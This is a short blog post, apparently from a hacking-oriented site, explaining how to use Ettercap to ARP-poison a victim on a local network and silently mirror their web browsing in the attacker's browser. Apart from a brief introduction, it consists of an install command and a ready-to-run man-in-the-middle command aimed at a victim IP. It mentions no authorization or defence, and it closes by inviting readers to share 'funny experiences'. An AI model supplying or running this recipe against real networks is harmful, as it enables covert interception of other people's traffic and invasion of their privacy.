---
layout: post
published: true
title: ! 'HackerGuide: Sniff Live Network Connections Using Ettercap'
permalink: /hackerguide-sniff-live-network-connections-using-ettercap/
wordpress_id: 609
categories:
- News
- Linux
- hack
- ssl
- sniff
- ettercap
- networking
- using ettercap
- ettercap guide
- ettercap ubuntu
- ettercap remote browser
- how to use ettercap
- LAN
- local network device
- network tool
---


Ettercap is a great and useful network tool. Ettercap is basically a suite of tools for sophisticated man in the middle attacks on LAN, VLAN, and WIFI-networks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols (even ciphered ones like SSL, SSH, and TLS) and includes many feature for network and host analysis.

The following guide will show howto use Ettercap to get local browser on the attacking machine silently follow web pages that a given victim visits.

<strong>Install ettercap</strong>

```

sudo aptitude install ettercap

```


<strong>Run ettercap</strong>

```

ettercap -T -Q -M arp:remote -i wlan0 /10.10.10.23/ // -P remote_browser 

```


<strong>wlan0</strong> denotes the local network device and <strong>10.10.10.23</strong> denotes the IP of the victim on the LAN.

Feel free to comment and share funny experiences - be careful - ettercap is a very powerful tool. 
